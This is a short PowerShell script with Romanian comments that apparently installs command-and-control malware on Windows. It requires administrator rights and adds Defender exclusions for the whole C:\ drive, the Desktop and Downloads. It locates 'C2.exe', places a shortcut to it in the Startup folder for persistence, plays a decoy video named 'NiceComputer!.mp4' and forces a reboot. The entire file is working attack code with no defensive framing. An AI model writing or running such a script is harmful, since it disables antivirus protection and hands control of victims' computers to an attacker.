
# Verifica daca userul a dat run as Admin

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole($adminRole)
}

if (-not (Test-Administrator)) {
    Write-Error "This script must be run as Administrator"
    exit 1
}

# Gaseste calea aplicatiei C2
function Find-C2Executable {
    param (
        [string]$fileName = "C2.exe"
    )
    $paths = Get-ChildItem -Path C:\ -Filter $fileName -Recurse -ErrorAction SilentlyContinue
    if ($paths.Count -gt 0) {
        return $paths[0].FullName
    } else {
        Write-Error "C2.exe not found"
        exit 1
    }
}

# Cai care sunt excluse
$pathToExclude = "C:\" 

$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")

$downloadsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")

# Adauga caile la exclusion list
Add-MpPreference -ExclusionPath $pathToExclude

Add-MpPreference -ExclusionPath $desktopPath

Add-MpPreference -ExclusionPath $downloadsPath

# Verifica exclusions
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath -and $exclusions -contains $downloadsPath) {

    # Obtine calea catre C2
	$progPath = Find-C2Executable

    # Calea catre Startup
	$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Redenumeste shortcut-ul
	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "C2.lnk")

# Creeaza un obiect WScript.Shell COM
	$wshShell = New-Object -ComObject WScript.Shell

# Creeaza shortcut-ul
	$shortcut = $wshShell.CreateShortcut($shortcutPath)

# Calea shortcut-ului_+salvare
	$shortcut.TargetPath = $progPath 
	$shortcut.Save()

# Calea catre videoclip, care se afla pe Desktop
        $videoPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "NiceComputer!.mp4")

# Daca o gaseste, reda videoclipul
if (Test-Path $videoPath) {
    Start-Process $videoPath
    #Write-Host "Playing video: $videoPath"
} else {
    Write-Error "Video file not found: $videoPath"
}

    #Write-Host "Successfully added paths to the exclusion list."
    #Dupa ce creeaza shortcutul+reda videoclipul, adoarme procesul 10 secunde, apoi restart
    
    Start-Sleep -Seconds 10
    Restart-Computer -Force
} else {
    Write-Error "Failed to add all paths to exclusion list"
}

#Acum, dupa Restart, C2 va porni automat la startup
